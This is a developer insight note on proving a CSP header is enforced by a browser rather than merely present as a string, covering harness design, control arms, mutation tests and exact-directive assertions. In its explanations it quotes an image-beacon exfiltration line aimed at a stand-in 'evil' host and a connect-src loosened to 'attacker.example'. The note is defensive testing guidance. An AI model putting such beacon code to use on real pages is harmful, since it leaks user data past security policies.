---
title: Proving a security header (CSP) is ENFORCED needs a header-applying harness, a no-policy control arm + mutation, and EXACT-directive assertions — a string check is theater
date: 2026-06-08
phase: P1·U0 (CSP enforcement harden)
modules: [scripts/serve-dist-with-headers.ts, e2e/csp.spec.ts, playwright.config.ts, scripts/__tests__/csp-headers.test.ts, vite.config.ts]
tags: [csp, security, playwright, vitest, testing, false-pass, theater]
---

## Problem
`CLAUDE.md` + the phase-1 plan claimed the strict CSP's "browser enforcement is verified," but the only test was a vitest regex over `vercel.json`. That proves the *string*, never that a browser *enforces* it. For a control whose whole job is guarding the cleartext model in the JS heap, a green-but-toothless gate is the cardinal calm-but-wrong sin.

## Root Cause — the ways a browser-enforcement test is GREEN while proving nothing
- **No real serving.** `vite preview` does NOT apply `vercel.json` headers (insight `docs/insights/001-strict-csp-vs-vite-pwa-inline-scripts.md`). Enforcement must be tested through a header-applying harness over `dist/` — and the harness must read the policy FROM `vercel.json` (never re-type it) so it proves the *shipped* string.
- **Vacuous assertion.** "An injected inline `<script>` was blocked" passes trivially if the injector is silently broken (wrong realm, never appended). It needs a **no-CSP control arm** — the SAME injector on a port serving no CSP must EXECUTE — and a **mutation test**: serve no-CSP on the enforced port and watch the enforced test go RED. Without both, "green" is unproven.
- **Substring assert defeated by ADDITIVE loosening.** `expect(csp).toContain("connect-src 'self'")` stays green under `connect-src 'self' https://attacker.example` — the exfil door opens with the test still green. (A pure *deletion* is caught — the substring drops and `default-src` backstops it — so only loosening slips, which is exactly the dangerous direction.) Parse directives and assert **exact** values.
- **Testing the easy directive, not the threat.** The first cut proved `script-src` (inline block) + `worker-src` but not `connect-src` — the literal *exfil* control for the in-memory model, and the most load-bearing directive for the stated threat. Cover the attack you actually fear (a cross-origin `fetch` must fire a `connect-src` violation), not just the convenient one.
- **Tooling false-fail.** Vitest's default include glob (`**/*.{test,spec}.?(c|m)[jt]s?(x)`) runs a Playwright `*.spec.ts` under Vitest and fails it (no `page` fixture). Exclude `e2e/**` in the Vitest config; let Playwright own that dir.

## Fix
A dependency-free two-port harness (4180 = all `vercel.json` headers incl. CSP; 4181 = all except CSP), the CSP selected by the `/(.*)` source predicate + fail-loud (not `headers[0]`). Playwright asserts the EFFECT (an inline script's flag stays false; a cross-origin `fetch` fires a `securitypolicyviolation` with `violatedDirective` `startsWith('connect-src')`), each with a no-CSP control arm, plus a mutation run proving both enforced tests go RED with the CSP removed. The Vitest guard parses the policy into a directive→value map and matches EXACT values. CI: `pnpm exec playwright install --with-deps chromium` → `pnpm verify:csp`.

## Key Insight
A security test must be **falsifiable**: prove it goes RED when the protection is removed (mutation), prove the probe itself works when the policy is absent (control), and assert the policy's EXACT values (a substring/`contains` is defeated by an appended token). And test the THREAT, not the easiest directive. "The header string is correct" is categorically not "the browser enforces it."

## Also Applies To
Any header-driven control proven by test (HSTS, `X-Frame-Options`, `Permissions-Policy`, CORS); any **allowlist** assertion anywhere — a `contains`/substring check on an allowlist passes when an extra entry is appended, so match the allowlist exactly. The control-arm + mutation discipline generalizes every "absence is enforced" test (cf. `projects/burned/docs/insights/027` presence companions, `projects/burned/docs/insights/070` determinism self-test against a planted positive).

## Reinforced — a PARTIAL exact-match has the same hole (second review pass, 2026-06-08)
Running the institutionalized reviewer AGAIN, this time on the *post-fix* code (the fixes the first review drove — which nobody had then reviewed), surfaced two omissions the first pass missed:
- **Exact-match the WHOLE allowlist, not a hand-picked subset.** The first fix exact-asserted `script-src`/`connect-src`/`worker-src`/`object-src`/`base-uri`/`frame-ancestors` but **omitted `img-src` and `form-action`** — the other exfil channels the threat model names. A partial application of "match exactly" leaves the identical green-loosening hole for the omitted members (`new Image().src='https://evil/?d='+data` is a fetch-free image-beacon exfil that `connect-src` does NOT cover). Fix: assert the **COMPLETE** policy as one directive→value table (deny-by-default — any added/removed/loosened/drifted directive reds), so coverage can never be silently partial.
- **A directive-value parser must reject duplicates (the browser is first-occurrence-wins).** A duplicated directive: the browser enforces the FIRST occurrence; a last-wins (`Map.set`) parser reads the tight LAST copy while the browser enforces a loose FIRST copy → green while loosened. Fail loud on a duplicate.
- **Meta:** a review that *generates* fixes leaves those fixes unreviewed — a second pass on the delta is where the first pass's own omissions surface. Three independent lenses (testing/security/adversary) converging on the same gap was the signal it was real (not a single reviewer's hunch).
